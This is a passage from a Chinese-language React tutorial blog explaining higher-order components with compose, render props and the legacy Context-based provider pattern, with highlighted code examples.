withOne);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">SuperX</span> = <span class="title function_">hoc</span>(X);</span><br></pre></td></tr></table></figure><p>在上面代码中使用的 <code>compose</code>，是函数式编程中很基础的一种方法，作用就是把多个函数组合为一个函数，在很多开源的代码库中都可以看到，下面是一个参考实现：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">compose</span>(<span class="params">...funcs</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (funcs.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">arg</span> =&gt;</span> arg</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (funcs.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> funcs[<span class="number">0</span>]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> funcs.<span class="title function_">reduce</span>(<span class="function">(<span class="params">a, b</span>) =&gt;</span> <span class="function">(<span class="params">...args</span>) =&gt;</span> <span class="title function_">a</span>(<span class="title function_">b</span>(...args)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />React 组件可以当做积木一样组合使用，现在有了 <code>compose</code>，可以把高阶组件也当做积木一样组合，进一步重用代码。假如一个应用中多个组件都需要同样的多个高阶组件包装，那就可以用 <code>compose</code> 组合这些高阶组件为一个高阶组件，这样在使用多个高阶组件的地方实际上就只需要使用一个高阶组件了。</p><p><a name="wolvZ"></a></p><h3 id="（5）不要滥用"><a href="#（5）不要滥用" class="headerlink" title="（5）不要滥用"></a>（5）不要滥用</h3><p>高阶组件虽然可以用一种可重用的方式扩充现有 React 组件的功能，但高阶组件并不是绝对完美的。</p><p>首先，高阶组件不得不处理 <code>displayName</code>。当 React 渲染出错的时候，靠组件的 <code>displayName</code> 静态属性来判断出错的组件类，而高阶组件总是创造一个新的 React 组件类，所以，每个高阶组件都需要处理一下 <code>displayName</code>。如果要做一个最简单的什么增强功能都没有的高阶组件，也必须要写下面这样的代码：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">withExample</span> = (<span class="params">Component</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">NewComponent</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Component</span> &#123;<span class="attr">...props</span>&#125; /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">NewComponent</span>.<span class="property">displayName</span> = <span class="string">`withExample(<span class="subst">$&#123;Component.displayName || Component.name || <span class="string">&#x27;Component&#x27;</span>&#125;</span>)`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">NewCompoennt</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />每个高阶组件都这么写，就会非常麻烦。对于 React 生命周期函数，高阶组件不用怎么特殊处理，但是，如果内层组件包含定制的静态函数，这些静态函数的调用在 React 生命周期之外，那么高阶组件就必须要在新产生的组件中增加这些静态函数的支持，这更加麻烦。</p><p>其次，高阶组件支持嵌套调用，这是它的优势。但是如果真的一大长串高阶组件被应用的话，当组件出错，看到的会是一个超深的 <code>stack trace</code>。</p><p>最后，使用高阶组件要避免重复产生 React 组件，比如，下面的代码是有问题的：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Example</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">EnhancedFoo</span> = <span class="title function_">withExample</span>(<span class="title class_">Foo</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">EnhancedFoo</span> /&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />像上面这样写，每一次渲染 <code>Example</code>，都会用高阶组件产生一个新的组件，虽然都叫做 <code>EnhancedFoo</code>，但是对 React 来说是一个全新的东西，在重新渲染的时候不会重用之前的虚拟 DOM，会造成极大的浪费。正确的写法是下面这样，自始至终只有一个 <code>EnhancedFoo</code> 组件类被创建：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">EnhancedFoo</span> = <span class="title function_">withExample</span>(<span class="title class_">Foo</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">Example</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">EnhancedFoo</span> /&gt;</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />总之，高阶组件是重用代码的一种方式，但并不是唯一方式，下面来看一种更加精妙的方式： render props。</p><p><a name="FcXKp"></a></p><h2 id="3-render-props"><a href="#3-render-props" class="headerlink" title="3. render props"></a>3. render props</h2><p><a name="gJlWg"></a></p><h3 id="（1）概念-1"><a href="#（1）概念-1" class="headerlink" title="（1）概念"></a>（1）概念</h3><p>所谓 <code>render props</code>，指的是让 React 组件的 props 支持函数这种模式。因为作为 props 传入的函数往往被用来渲染一部分界面，所以这种模式被称为 render props。</p><p><strong>高阶组件的使用姿势是用“函数”包裹“组件”，而 render props 恰恰相反，它强调的是用“组件”包裹“函数”。</strong></p><p>一个简单的 render props 组件 <code>RenderAll</code>，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">RenderAll</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span>(</span><br><span class="line">     <span class="language-xml"><span class="tag">&lt;<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;props.children(props)&#125;</span></span><br><span class="line"><span class="language-xml">     <span class="tag">&lt;/<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />这个 <code>RenderAll</code> 预期子组件是一个函数，它所做的事情就是把子组件当做函数调用，调用参数就是传入的 <code>props</code>，然后把返回结果渲染出来，除此之外什么事情都没有做。使用 <code>RenderAll</code> 的代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">RenderAll</span>&gt;</span><br><span class="line">   &#123;<span class="function">() =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>&#125;</span><br><span class="line">&lt;/<span class="title class_">RenderAll</span>&gt;</span><br></pre></td></tr></table></figure><p><br />可以看到，<code>RenderAll</code> 的子组件，也就是夹在 <code>RenderAll</code> 标签之间的部分，其实是一个函数。这个函数渲染出 <code>&lt;h1&gt;hello world&lt;/h1&gt;</code>，这就是上面使用 <code>RenderAll</code> 渲染出来的结果。当然，这个 <code>RenderAll</code> 没做任何实际工作。</p><p><a name="heIWh"></a></p><h3 id="（2）传递-props"><a href="#（2）传递-props" class="headerlink" title="（2）传递 props"></a>（2）传递 props</h3><p>和高阶组件一样，render props 可以做很多的定制功能，下面以根据是否登录状态来显示一些界面元素为例，下面来实现一个 render props。</p><p>下面是实现 render props 的 <code>Login</code>组件，可以看到，render props 和高阶组件的第一个区别，就是 render props 是真正的 React 组件，而不是一个返回 React 组件的函数：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Login</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> userName = <span class="title function_">getUserName</span>();</span><br><span class="line">  <span class="keyword">if</span> (userName) &#123;</span><br><span class="line">    <span class="keyword">const</span> allProps = &#123;userName, ...props&#125;;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;props.children(allProps)&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当用户处于登录状态，<code>getUserName</code> 返回当前用户名，否则返回空，然后根据这个结果决定是否渲染 <code>props.children</code> 返回的结果。</p><p>当然，render props 完全可以决定哪些 <code>props</code> 可以传递给 <code>props.children</code>，在 <code>Login</code> 中，把 <code>userName</code> 作为增加的 <code>props</code> 传递给下去，这样就是 <code>Login</code> 的增强功能。一个使用上面 <code>Login</code> 的 JSX 代码示例如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Login</span>&gt;</span><br><span class="line">    &#123;<span class="function">(<span class="params">&#123;userName&#125;</span>) =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;userName&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>&#125;</span><br><span class="line"> &lt;/<span class="title class_">Login</span>&gt;</span><br></pre></td></tr></table></figure><p><br />对于名为“React”的用户登录，上面的 JSX 会产生 <code>&lt;h1&gt;Hello React&lt;/h1&gt;</code>。</p><p><a name="CrEI3"></a></p><h3 id="（3）不局限于-children"><a href="#（3）不局限于-children" class="headerlink" title="（3）不局限于 children"></a>（3）不局限于 children</h3><p>在上面的例子中，作为 render 方法的 props 就是 <code>children</code>，这种模式可以看做“以函数为子组件（function as child）”，这可以算是 render props 的一种具体形式，也就利用 <code>children</code> 这个 props 来作为函数传递。</p><p>实际上，render props 这个模式不必局限于 <code>children</code> 这一个 props，任何一个 props 都可以作为函数，也可以利用多个 props 来作为函数。</p><p>下面来扩展 <code>Login</code>，不只在用户登录时显示一些东西，也可以定制用户没有登录时显示的东西，这个组件叫做 <code>Auth</code>，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Auth</span>= (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> userName = <span class="title function_">getUserName</span>();</span><br><span class="line">  <span class="keyword">if</span> (userName) &#123;</span><br><span class="line">    <span class="keyword">const</span> allProps = &#123;userName, ...props&#125;;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;props.login(allProps)&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;props.nologin(props)&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />使用 <code>Auth</code> 可以分别通过 <code>login</code> 和 <code>nologin</code> 两个 <code>props</code> 来指定用户登录或者没登录时显示什么，用法如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Auth</span></span><br><span class="line">    login=&#123;<span class="function">(<span class="params">&#123;userName&#125;</span>) =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;userName&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>&#125;</span><br><span class="line">    nologin=&#123;<span class="function">() =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Please login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>&#125;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><p><a name="oBVz0"></a></p><h3 id="（4）依赖注入"><a href="#（4）依赖注入" class="headerlink" title="（4）依赖注入"></a>（4）依赖注入</h3><p>render props 其实就是 React 中的“依赖注入”（Dependency Injection)。所谓依赖注入，指的是解决这样一个问题：逻辑 A 依赖于逻辑 B，如果让 A 直接依赖于 B，当然可行，但是 A 就没法做得通用了。依赖注入就是把 B 的逻辑以函数形式传递给 A，A 和 B 之间只需要对这个函数接口达成一致就行，如此一来，再来一个逻辑 C，也可以用一样的方法重用逻辑 A。</p><p>在上面示例中，<code>Login</code> 和 <code>Auth</code> 组件就是上面所说的逻辑 A，而传递给组件的函数类型 props，就是逻辑 B 和 C。</p><p><a name="hH4fS"></a></p><h3 id="（5）render-props-和高阶组件对比"><a href="#（5）render-props-和高阶组件对比" class="headerlink" title="（5）render props 和高阶组件对比"></a>（5）render props 和高阶组件对比</h3><p>下面来比对一下这两种重用 React 组件逻辑的模式。</p><p>首先，render props 模式的应用，就是做一个 React 组件，而高阶组件，虽然名为“组件”，其实只是一个产生 React 组件的函数。render props 不像高阶组件有那么多毛病，render props 的缺点就是 render props 不能像高阶组件那样链式调用，当然，这并不是一个致命缺点。</p><p>render props 相对于高阶组件还有一个显著优势，就是对于新增的 props 更加灵活。还是以登录状态为例，假如扩展 <code>withLogin</code> 的功能，让它给被包裹的组件传递用户名这个 props，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">withLogin</span> = (<span class="params">Component</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">NewComponent</span> = (<span class="params">props</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> userName= <span class="title function_">getUserName</span>();</span><br><span class="line">    <span class="keyword">if</span> (userName) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Component</span> &#123;<span class="attr">...props</span>&#125; <span class="attr">userName</span>=<span class="string">&#123;userName&#125;/</span>&gt;</span></span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">NewComponent</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />这就要求被 <code>withLogin</code> 包住的组件要接受 <code>userName</code> 这个 props。可是，假如有一个现成的 React 组件不接受 <code>userName</code>，却接受名为 <code>name</code> 的 props 作为用户名，就不能直接用 <code>withLogin</code> 包住这个 React 组件，还要再造一个组件来做 <code>userName</code> 到 <code>name</code> 的映射，很麻烦。</p><p>对于应用 render props 的 <code>Login</code>，就不存在这个问题，可以这样写：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Login</span>&gt;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">(<span class="params">props</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123;userName&#125; = props;</span><br><span class="line">      <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">TheComponent</span> &#123;<span class="attr">...props</span>&#125; <span class="attr">name</span>=<span class="string">&#123;userName&#125;</span> /&gt;</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/<span class="title class_">Login</span>&gt;</span><br></pre></td></tr></table></figure><p><br />所以，当需要重用 React 组件的逻辑时，首先看这个功能是否可以抽象为一个简单的组件；如果行不通的话，考虑是否可以应用 render props 模式；再不行的话，才考虑应用高阶组件模式。</p><p><a name="whtTy"></a></p><h2 id="4-提供者模式"><a href="#4-提供者模式" class="headerlink" title="4. 提供者模式"></a>4. 提供者模式</h2><p>在 React 中，props 是组件之间通讯的主要手段，但是有一种场景单纯靠 props 来通信是不恰当的，那就是两个组件之间间隔着多层其他组件，下面是一个组件树示例图：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612606526643-c8006ca8-54b6-409a-9244-e1d38f29df25.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612606526643-c8006ca8-54b6-409a-9244-e1d38f29df25.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>在上图中，组件 A 需要传递信息给组件 X，如果通过 props 的话，那么从顶部的组件 A 开始，要把 props 传递给组件 B，然后组件 B 传递给组件 D，最后组件 D 再传递给组件 X。其实组件 B 和组件 D 完全用不上这些 props，但是又被迫传递这些 props，这明显不合理，要知道组件树的结构会变化的，将来如果组件 B 和组件 D 之间再插入一层新的组件，这个组件也需要传递这个 props，这就麻烦无比。</p><p>可见，对于跨级的信息传递，需要一个更好的方法。在 React 中，解决这个问题应用的就是“提供者模式”。</p><p><a name="SLj4S"></a></p><h3 id="（1）概念-2"><a href="#（1）概念-2" class="headerlink" title="（1）概念"></a>（1）概念</h3><p>虽然这个模式叫做“提供者模式”，但是其实有两个角色，一个是“提供者”（Provider），另一个是“消费者”（Consumer），这两个角色都是 React 组件。其中“提供者”在组件树上居于比较靠上的位置，“消费者”处于靠下的位置。在上面的组件树中，组件 A 可以作为提供者，组件 X 就是消费者。</p><p>提供者可以提供一些信息，而且这些信息在它之下的所有组件，无论隔了多少层，都可以直接访问到，而不需要通过 props 层层传递。<br />避免 props 逐级传递。</p><p><a name="La18t"></a></p><h3 id="（2）实现提供者模式"><a href="#（2）实现提供者模式" class="headerlink" title="（2）实现提供者模式"></a>（2）实现提供者模式</h3><p>实现提供者模式需要 React 的 <code>Context</code> 功能，可以说，提供者模式只不过是让 <code>Context</code> 功能更好用一些而已。</p><p>所谓 <code>Context</code> 功能，就是能够创造一个“上下文”，在这个上下文之下的所有组件都可以访问同样的数据。</p><p>在 <code>React v16.3.0</code> 之前，React 虽然提供了 Context 功能，但是官方文档上都建议尽量不要使用。当 React 发布 v16.3.0 时，提供了“正式版本”的 <code>Context</code> 功能 API，和之前的有很大不同。</p><p>提供者模式的一个典型用例就是实现“样式主题”（Theme），由顶层的提供者确定一个主题，下面的样式就可以直接使用对应主题里的样式。这样，当需要切换样式时，只需要修改提供者就行，其他组件不用修改。<br><a name="NWZTf"></a></p><h3 id="（3）React-v16-3-0-之前的提供者模式"><a href="#（3）React-v16-3-0-之前的提供者模式" class="headerlink" title="（3）React v16.3.0 之前的提供者模式"></a>（3）React v16.3.0 之前的提供者模式</h3><p>在 React v16.3.0 之前，要实现提供者就要实现一个 React 组件，不过这个组件要做两个特殊处理：<br />● 需要实现 <code>getChildContext</code> 方法，用于返回“上下文”的数据；<br />● 需要定义 <code>childContextTypes</code> 属性，声明“上下文”的结构。</p><p>下面就是一个实现“提供者”的例子，组件名为 <code>ThemeProvider</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThemeProvider</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">getChildContext</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">theme</span>: <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">value</span></span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;this.props.children&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">ThemeProvider</span>.<span class="property">childContextTypes</span> = &#123;</span><br><span class="line">  <span class="attr">theme</span>: <span class="title class_">PropTypes</span>.<span class="property">object</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />在这个例子中，<code>getChildContext</code> 只是简单返回名为 <code>value</code> 的 <code>props</code> 值，但是，因为 <code>getChildContext</code> 是一个函数，它可以有更加复杂的操作，比如可以从 state 或者其他数据源获得数据。</p><p>对于 <code>ThemeProvider</code>，创造了一个上下文，这个上下文就是一个对象，结构是这样：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">theme</span>: &#123;</span><br><span class="line">    <span class="comment">//一个对象</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />接下来做两个消费（也就是使用）这个“上下文”的组件，第一个是 Subject，代表标题；第二个是 <code>Paragraph</code>，代表章节。把 <code>Subject</code> 实现为一个类，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Subject</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;mainColor&#125; = <span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">theme</span>;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&#123;&#123;color:</span> <span class="attr">mainColor</span>&#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;this.props.children&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Subject</span>.<span class="property">contextTypes</span> = &#123;</span><br><span class="line">  <span class="attr">theme</span>: <span class="title class_">PropTypes</span>.<span class="property">object</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />在 <code>Subject</code> 的 <code>render</code> 函数中，可以通过 <code>this.context</code> 访问到“上下文”数据，因为 <code>ThemeProvider</code> 提供的“上下文”包含 <code>theme</code> 字段，所以可以直接访问 <code>this.context.theme</code>。</p><p><code>Subject</code> 必须增加 <code>contextTypes</code> 属性，必须和 <code>ThemeProvider</code> 的 <code>childContextTypes</code> 属性一致，不然，<code>this.context</code> 就不会得到任何值。</p><p>React 要求“提供者”用 <code>childContextTypes</code> 定义一次上下文结构，“消费者”再用 <code>contextTypes</code> 再重复定义一次，这是考虑到“上下文”可能会嵌套，就是一个“提供者”套着另一个“提供者”，这时候，底层的消费者组件到底消费哪一个“提供者”呢？通过这种显示的方式指定。</p><p>上面的 <code>Subject</code> 是一个类，其实也可以把消费者实现为一个纯函数组件，只不过访问“上下文”的方式有些不同，用纯函数的方式实现另一个消费者 <code>Paragraph</code>，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Paragraph</span> = (<span class="params">props, context</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;textColor&#125; = context.<span class="property">theme</span>;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&#123;&#123;color:</span> <span class="attr">textColor</span>&#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;props.children&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title class_">Paragraph</span>.<span class="property">contextTypes</span> = &#123;</span><br><span class="line">  <span class="attr">theme</span>: <span class="title class_">PropTypes</span>.<span class="property">object</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />从上面的代码可以看到，因为 <code>Paragraph</code> 是一个函数形式，所以不可能访问 <code>this.context</code>，但是函数的第二个参数其实就是 <code>context</code>。当然，也不要忘了设定 <code>Paragraph</code> 的 <code>contextTypes</code>，不然参数 <code>context</code> 也不会是上下文。</p><p>最后，来看如何结合”提供者“和”消费者“。做一个组件来使用 <code>Subject</code> 和 <code>Paragraph</code>，这个组件不需要帮助传递任何 props，代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Page</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Subject</span>&gt;</span>这是标题<span class="tag">&lt;/<span class="name">Subject</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Paragraph</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      这是正文</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Paragraph</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><br />上面的组件 Page 使用了 <code>Subject</code> 和 <code>Paragraph</code>，现在想要定制样式主题，只需要在 <code>Page</code> 或者任何需要应用这个主题的组件外面包上 <code>ThemeProvider</code>，对应的 JSX 代码如下：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 